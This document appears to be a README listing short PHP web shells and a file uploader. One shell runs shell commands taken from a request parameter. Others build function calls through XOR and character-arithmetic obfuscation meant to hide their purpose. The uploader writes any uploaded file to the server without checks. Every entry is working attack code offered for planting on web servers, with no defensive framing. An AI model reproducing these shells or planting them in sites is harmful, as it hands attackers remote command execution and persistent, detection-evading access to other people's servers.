# simple-and-obfuscate-PHP-shell and uploader
several list of simple and obfuscate PHP shell and uploader

```
<?= `{$_REQUEST['_']}` ?>
```
```
<?php
$_="{";
$_=($_^"<").($_^">;").($_^"/");
?>
```
```
<?=${'_'.$_}["_"](${'_'.$_}["__"]);?>
```
```
<? @$_[]=@!+_; $__=@${_}>>$_;$_[]=$__;$_[]=@_;$_[((++$__)+($__++ ))].=$_;
$_[]=++$__; $_[]=$_[--$__][$__>>$__];$_[$__].=(($__+$__)+ $_[$__-$__]).($__+$__+$__)+$_[$__-$__];
$_[$__+$__] =($_[$__][$__>>$__]).($_[$__][$__]^$_[$__][($__<<$__)-$__] );
$_[$__+$__] .=($_[$__][($__<<$__)-($__/$__)])^($_[$__][$__] );
$_[$__+$__] .=($_[$__][$__+$__])^$_[$__][($__<<$__)-$__ ];
$_=$
$_[$__+ $__] ;$_[@-_]($_[@!+_] );
?>
```
```
<?php echo 'Uploader<br>';echo '<br>';echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';if( $_POST['_upl'] == "Upload" ) {if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload !!!</b><br><br>'; }else { echo '<b>Upload !!!</b><br><br>'; }}?>
```
